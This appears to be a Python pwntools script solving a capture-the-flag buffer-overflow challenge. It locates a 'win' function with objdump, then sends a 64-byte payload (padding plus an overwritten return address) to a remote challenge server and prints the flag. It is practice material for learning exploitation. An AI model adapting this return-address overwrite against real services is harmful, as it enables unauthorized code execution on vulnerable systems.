from pwn import *
import os 

os.system('objdump -d RIP_my_bof/pwn-simple-rip/server  | grep win')

r = remote('thekidofarcrania.com',4902)
r.sendlineafter(b'Input some text: ', b'\x08'*60 + b'\x86\x85\x04\x08')
flag = r.recvuntil(b'}').decode().split('\n')[-1]
print(flag)